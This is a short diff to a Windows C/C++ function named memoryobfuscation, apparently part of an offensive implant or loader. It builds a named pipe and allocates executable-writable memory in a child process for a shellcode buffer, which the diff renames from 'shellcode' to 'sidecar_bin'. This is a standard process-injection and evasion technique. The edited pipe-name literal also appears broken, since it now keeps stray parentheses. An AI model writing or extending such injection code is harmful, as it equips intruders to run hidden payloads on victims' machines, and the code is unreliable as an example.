@@ -47,7 +47,7 @@ void memoryobfuscation(){
     char* result = (char*)malloc(bufferSize);
     sprintf_s(result, bufferSize, "\"%s\" %lu 0x%p 0x%lx", exeName, pid, textInfo.baseAddress, textInfo.size);
 
-    const char* pipeName = R"(\\.\pipe\5c8a150ae68b4cbc8b5eeacb0f89b7aa)";
+    const char* pipeName = "(\\\\.\\pipe\\5c8a150ae68b4cbc8b5eeacb0f89b7aa)";
     HANDLE hPipe = CreateNamedPipeA(
         pipeName,
         PIPE_ACCESS_OUTBOUND,
@@ -72,7 +72,7 @@ void memoryobfuscation(){
         return;
     }
 
-    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sidecar_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMem) {
         return;
     }
@@ -93,5 +93,5 @@ void memoryobfuscation(){
     CloseHandle(hThread);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    free(shellcode);
+    free(sidecar_bin);
 }
